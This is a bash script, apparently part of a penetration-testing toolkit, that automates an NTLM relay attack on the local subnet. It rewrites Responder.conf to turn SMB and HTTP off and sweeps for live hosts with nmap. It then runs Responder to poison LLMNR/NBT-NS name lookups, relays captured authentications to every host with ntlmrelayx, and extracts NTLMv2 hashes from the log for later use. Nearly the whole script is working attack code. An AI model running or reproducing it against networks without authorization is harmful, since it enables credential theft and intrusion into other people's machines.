#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "NTLM RELAY" "Responder + ntlmrelayx — LLMNR/NBT-NS capture → SMB relay"

require_tool responder "apt install responder"
require_tool nmap      "apt install nmap"

# Detect ntlmrelayx (naming differs between Kali versions)
_relay_cmd=""
if command -v ntlmrelayx.py &>/dev/null; then
  _relay_cmd="ntlmrelayx.py"
elif command -v impacket-ntlmrelayx &>/dev/null; then
  _relay_cmd="impacket-ntlmrelayx"
else
  printf '  %s[!]%s ntlmrelayx not found — install impacket: %spip3 install impacket%s\n' \
    "${RED}" "${RESET}" "${DIM}" "${RESET}"; exit 1
fi

outdir="$(make_outdir)"
RESPONDER_LOG="$outdir/responder.log"
NTLMRELAYX_LOG="$outdir/ntlmrelayx.log"
TARGETS_FILE="$outdir/targets.txt"

RESPONDER_CONF="/etc/responder/Responder.conf"
BACKUP_CONF="$outdir/Responder-orig.conf"
TMP_DB="/tmp/Responder.db"
RESPONDER_PID=""

# ── Interface selection ────────────────────────────────────────────────────────
section "INTERFACE"

if [[ -n "${SESSION_DIR:-}" ]]; then
  IFACE="$(resolve_iface any)"
  printf '  %s[CHAIN]%s Interface: %s%s%s  (auto-detected)\n\n' \
    "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
else
  mapfile -t _ifaces < <(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | grep -vE '^(rmnet|r_rmnet|bond|dummy)')
  if [[ ${#_ifaces[@]} -eq 0 ]]; then
    printf '  %s[!]%s No network interfaces found%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
  fi
  for i in "${!_ifaces[@]}"; do
    _ip=$(ip -o -4 addr show "${_ifaces[$i]}" 2>/dev/null | awk '{print $4}' | head -1)
    printf '  %s[%02d]%s  %-14s  %s%s%s\n' \
      "${CYAN}" "$((i+1))" "${RESET}" "${_ifaces[$i]}" "${DIM}" "${_ip:-no IPv4}" "${RESET}"
  done
  printf '\n  %s>>%s Interface [1-%d]: ' "${CYAN}" "${RESET}" "${#_ifaces[@]}"
  read -r _sel; _sel="${_sel:-1}"
  if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_ifaces[@]} )); then
    printf '  %s[!]%s Invalid selection%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
  fi
  IFACE="${_ifaces[$((_sel-1))]}"
fi

IP_CIDR=$(ip -o -4 addr show "$IFACE" 2>/dev/null | awk '{print $4}' | head -1)
IP_ADDR="${IP_CIDR%%/*}"
PREFIX="${IP_CIDR##*/}"

if [[ -z "$IP_ADDR" ]]; then
  printf '  %s[!]%s No IPv4 address on %s%s\n' "${RED}" "${RESET}" "$IFACE" "${RESET}"; exit 1
fi

IFS='.' read -r _i1 _i2 _i3 _ <<< "$IP_ADDR"
SUBNET="${_i1}.${_i2}.${_i3}.0/${PREFIX}"

printf '\n  %s[SYS]%s Interface : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE"  "${RESET}"
printf '  %s[SYS]%s IP        : %s%s%s\n'  "${CYAN}" "${RESET}" "${GREEN}" "$IP_ADDR" "${RESET}"
printf '  %s[SYS]%s Subnet    : %s%s%s\n'  "${CYAN}" "${RESET}" "${DIM}"   "$SUBNET"  "${RESET}"
printf '  %s[SYS]%s Relay cmd : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_relay_cmd" "${RESET}"

# ── Cleanup ────────────────────────────────────────────────────────────────────
_cleanup() {
  printf '\n  %s[*]%s Stopping Responder...\n' "${CYAN}" "${RESET}"
  [[ -n "$RESPONDER_PID" ]] && kill "$RESPONDER_PID" 2>/dev/null; wait 2>/dev/null || true

  printf '  %s[*]%s Restoring Responder.conf...\n' "${CYAN}" "${RESET}"
  if [[ -f "$BACKUP_CONF" && -f "$RESPONDER_CONF" ]]; then
    cp "$BACKUP_CONF" "$RESPONDER_CONF" \
      && printf '  %s[+]%s Config restored\n' "${GREEN}" "${RESET}" \
      || printf '  %s[!]%s Restore failed — backup at: %s\n' "${RED}" "${RESET}" "$BACKUP_CONF"
  fi

  printf '\n  %s[SYS]%s Responder log  : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$RESPONDER_LOG"   "${RESET}"
  printf '  %s[SYS]%s Relay log      : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$NTLMRELAYX_LOG" "${RESET}"

  # ── Pipeline chain ──────────────────────────────────────────────────────────
  if [[ -n "${SESSION_DIR:-}" ]]; then
    # NTLMv2 hashes from Responder log → chain_hashes.txt
    if [[ -f "$RESPONDER_LOG" ]]; then
      grep -oiE '[a-zA-Z0-9._-]+::[a-zA-Z0-9._-]*:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+' \
        "$RESPONDER_LOG" 2>/dev/null | sort -u >> "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
      sort -u "${SESSION_DIR}/chain_hashes.txt" -o "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
      _hh=$(wc -l < "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || echo 0)
      [[ "$_hh" -gt 0 ]] && printf '  %s[CHAIN]%s chain_hashes.txt: %s NTLMv2 hash(es) from relay%s\n\n' \
        "${CYAN}" "${RESET}" "$_hh" "${RESET}"
    fi
    # Relay targets → alive_hosts.txt
    if [[ -f "$TARGETS_FILE" ]]; then
      cat "$TARGETS_FILE" >> "${SESSION_DIR}/alive_hosts.txt" 2>/dev/null || true
      sort -u "${SESSION_DIR}/alive_hosts.txt" -o "${SESSION_DIR}/alive_hosts.txt" 2>/dev/null || true
    fi
    mark_done "$outdir"
  fi
}
trap '_cleanup' EXIT

# ── Patch Responder.conf ───────────────────────────────────────────────────────
section "RESPONDER CONFIGURATION"

if [[ ! -f "$RESPONDER_CONF" ]]; then
  printf '  %s[!]%s %s not found%s\n' "${RED}" "${RESET}" "$RESPONDER_CONF" "${RESET}"; exit 1
fi

printf '  %s[*]%s Backing up Responder.conf...\n' "${CYAN}" "${RESET}"
cp "$RESPONDER_CONF" "$BACKUP_CONF"
printf '  %s[+]%s Backup saved\n' "${GREEN}" "${RESET}"

printf '  %s[*]%s Disabling SMB and HTTP in Responder (relay requires them off)...\n' "${CYAN}" "${RESET}"
sed -i 's/^SMB = On/SMB = Off/'   "$RESPONDER_CONF"
sed -i 's/^HTTP = On/HTTP = Off/' "$RESPONDER_CONF"
sed -i "s|^DatabaseFile =.*|DatabaseFile = $TMP_DB|" "$RESPONDER_CONF"
printf '  %s[+]%s Responder configured for relay mode\n\n' "${GREEN}" "${RESET}"

# ── Host discovery ─────────────────────────────────────────────────────────────
section "HOST DISCOVERY"

printf '  %s[*]%s Scanning %s%s%s for live hosts...\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$SUBNET" "${RESET}"
nmap -sn "$SUBNET" 2>/dev/null \
  | grep "Nmap scan report for" \
  | awk '{print $NF}' \
  | tr -d '()' > "$TARGETS_FILE" || true

_count=0
[[ -s "$TARGETS_FILE" ]] && _count=$(wc -l < "$TARGETS_FILE")

if (( _count == 0 )); then
  printf '  %s[!]%s No live hosts found on %s%s\n' "${RED}" "${RESET}" "$SUBNET" "${RESET}"; exit 1
fi

printf '  %s[+]%s %s%d%s live hosts — relay targets:\n\n' \
  "${GREEN}" "${RESET}" "${BOLD}" "$_count" "${RESET}"
while IFS= read -r _h; do
  printf '    %s%s%s\n' "${DIM}" "$_h" "${RESET}"
done < "$TARGETS_FILE"
printf '\n'

# ── Launch ────────────────────────────────────────────────────────────────────
section "RELAY ATTACK"

printf '  %s[*]%s Starting Responder on %s%s%s (background)...\n' \
  "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
responder -I "$IFACE" -dwP > "$RESPONDER_LOG" 2>&1 &
RESPONDER_PID=$!
printf '  %s[+]%s Responder PID: %s%d%s\n\n' "${GREEN}" "${RESET}" "${DIM}" "$RESPONDER_PID" "${RESET}"

printf '  %s[*]%s Starting ntlmrelayx → %s%d%s targets...\n' \
  "${CYAN}" "${RESET}" "${BOLD}" "$_count" "${RESET}"
printf '  %s[*]%s Press %sCTRL+C%s to stop\n\n' "${CYAN}" "${RESET}" "${BOLD}" "${RESET}"

"$_relay_cmd" -tf "$TARGETS_FILE" -smb2support 2>&1 | (trap '' SIGINT; tee "$NTLMRELAYX_LOG") || true
